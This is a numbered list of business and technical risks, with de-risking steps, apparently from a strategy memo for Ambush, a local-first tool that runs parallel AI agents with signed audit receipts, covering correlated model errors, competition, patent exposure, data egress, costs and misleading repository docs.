1. **Validated fan-out may be impossible (the fail-regardless risk).** BYO-agents are the same 2-3 frontier models; their errors are correlated, so N lanes agreeing can be one model hallucinating N times. *Cheapest experiment:* the §5 offline eval — gated to KILL the company at Week 3, before any product, if H1 or H2 fail.
2. **Commoditization from above and below.** Claude Code Agent Teams + Semgrep/Endor can each ship "governed parallel agents with an audit log." *De-risk:* lean into what they structurally cannot — **local-first, BYO-agent, portable client-verifiable attestation, fused as one surface** (the intersection, not any single axis) — and measure whether a design partner picks Ambush *over* Agent Teams for a real NDA engagement.
3. **The governance differentiator is a vitamin AND the primitive is commoditizing.** Nobody asks for non-repudiation by name, and the receipt primitive itself is standardizing (IETF draft, Cedar, the Attested Intelligence patent-pending twin). *De-risk:* never sell the primitive as the moat — sell the intersection; lead the sale with the slop-filter; **instrument who brings up the signed audit first** in the Pro→Org conversation — if partners treat the attestation as "nice to have," re-examine the moat fast.
4. **Freedom-to-operate / patent encumbrance (new, load-bearing).** A **patent-pending twin (Attested Intelligence)** ships a near-identical Ed25519 hash-chained per-tool-call receipt — so Ambush's attestation primitive may be **encumbered by someone else's IP**, not just commoditized. *De-risk:* commission an FTO/patent landscape review on the receipt-per-tool-call primitive **before** marketing attestation as a differentiator or raising on it; lean on standards alignment (in-toto/Sigstore/IETF) as both credibility and prior-art posture; keep the moat framed as the *intersection*, which is far harder to encumber than the bare primitive.
5. **The model-egress contradiction undermines "local" at the exact wedge.** The NDA/burst wedge is where "local" matters most, yet every frontier-model lane egresses the source. *De-risk:* settle it empirically with the first 5-10 partners (§4-#4, §8) — if NDA processes accept BYO-key cloud inference under DPA, drop "local-only is mandatory" as the rationale and keep "your perimeter, keys, audit, defensible deliverable"; if they don't, **promote local-model benchmarking to a gating eval arm (§5) and fund the air-gap path as load-bearing.** Never claim "nothing leaves the box" about a frontier-model engagement.
6. **The cost/rate-limit doom-loop and the brand blocker (combined operational risk).** The ~$4-7k/hr cache-expiry blowup and the ClawdStrike legal exposure are both live, cheap-to-close, and reputationally radioactive if left. *De-risk:* ship the bounded launcher + per-lane credentials + 429 governor + EnvScrub in the first 8 weeks; **kill the ClawdStrike codename this week** and run formal clearance before any funding announcement or repo publication.
7. **The repo's own docs are a diligence landmine.** PRODUCT/GOVERNANCE-SECURITY docs are graded "misleading" (§2) — a buyer reading them sees false fail-closed/non-repudiation claims today. *De-risk:* correct the public artifacts in Weeks 1-3, before any partner or investor opens the repo.
